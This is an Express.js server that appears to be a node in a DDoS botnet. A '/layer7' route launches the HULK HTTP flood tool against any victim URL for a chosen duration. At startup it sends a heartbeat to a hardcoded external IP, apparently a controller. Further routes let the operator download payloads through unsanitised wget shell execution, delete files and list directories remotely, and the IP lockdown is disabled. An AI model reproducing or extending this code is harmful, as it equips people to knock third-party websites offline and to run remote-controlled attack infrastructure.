const express = require('express')
const { spawn } = require('child_process');
const app = express()
const delay = require('delay')
const axios = require('axios')
const lockdown = false
const port = 3000 // access port
const managerIP = "" //only IP that can send commands in if lockdown === true.
var http = require('http')
var fs = require('fs')


let machineBusy = false //machine attack state declaration
let pythonActive = false //python state declaration
let python = null //defining python beforehand so we can change it afterwards


function inithb() {
    var options = { method: 'POST', url: 'http://18.193.150.142:30120/hb/' };

    axios.request(options).then(function (response) {
        console.log(response.data);
    }).catch(function (error) {
        console.error(error);
    });
}
inithb()
app.use((req, res, next) => {
    var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    var accessedPN = req.originalUrl;
    var accesstype = req.method
    res.setHeader('Acces-Control-Allow-Origin', '*');
    res.setHeader('Acces-Control-Allow-Methods', 'GET,POST,PUT,PATCH,DELETE');
    res.setHeader('Acces-Contorl-Allow-Methods', 'Content-Type', 'Authorization');
    if (lockdown) {
        if (!(ip === managerIP)) {
            res.send(403, { error: "UNAUTHORIZED&_FUCK_OFF" })
        }
    }
    next();
})

app.get('/layer7/:victim/:time', (req, res) => {
    if (!(machineBusy)) {
        let victim = req.params.victim
        let timelimit = req.params.time
        if (isNaN(timelimit)) {
            res.send(405, { error: "INVALID_TIME_LIMIT" })
        }
        else {
            mainT(victim, timelimit)
            machineBusy = true
            res.send(200, { success: `Attacking ${victim} with TL ${timelimit}` })
        }
    }
    else {
        res.send(405, { error: "MACHINE_IS_BUSY" })
    }
})




app.get('/remfile/:valx/', (req, res) => {

    const path = './' + req.params.valx

    try {
        fs.unlinkSync(path)
        res.send(200)
    } catch (err) {
        res.send(500, { err })
    }

})

app.get('/addfile/:fin/:exn/', (req, res) => {
    let cp = require('child_process')
    let filn = ((req.params.fin).replace(/ç/g, "/"))
    let exn = req.params.exn
    let download = async function (filename) {
        let command = `wget ${filename}`;
        let result = cp.execSync(command);
    };
    async function test(filn) {
        await download(filn)
    }
    test(filn)
    res.send(200)
})

app.get('/listdir/', (req, res) => {
    let folderarr = []
    const testFolder = './';
    const fs = require('fs');

    fs.readdirSync(testFolder).forEach(file => {
        folderarr.push(file)
    });
    res.send(200, { folderarr })
})


app.get('/layer7stop/', (req, res) => {
    if (pythonActive) {
        python.kill("SIGINT")
        python.kill("SIGTERM")
        machineBusy = false
        pythonActive = false
        res.send(200)
    }
    else {
        res.send(405, { error: "NO_PROCESSES_ACTIVE" })
    }
});

async function mainT(victim, time) {
    if (!(pythonActive)) {
        machineBusy = true
        pythonActive = true
        python = spawn('/usr/bin/python2', ['/home/ubuntu/l7flood/hulk.py', `http://${victim}`]);

        machineBusy = true
        pythonActive = true
        await delay(time * 1000)
        if (pythonActive) {
            python.kill("SIGINT")
            python.kill("SIGTERM")
            console.log("KILLED PYTHON.")
            machineBusy = false
            pythonActive = false
        }
    }
}

app.listen(port, () => console.log(`App listening on port
${port}!`))
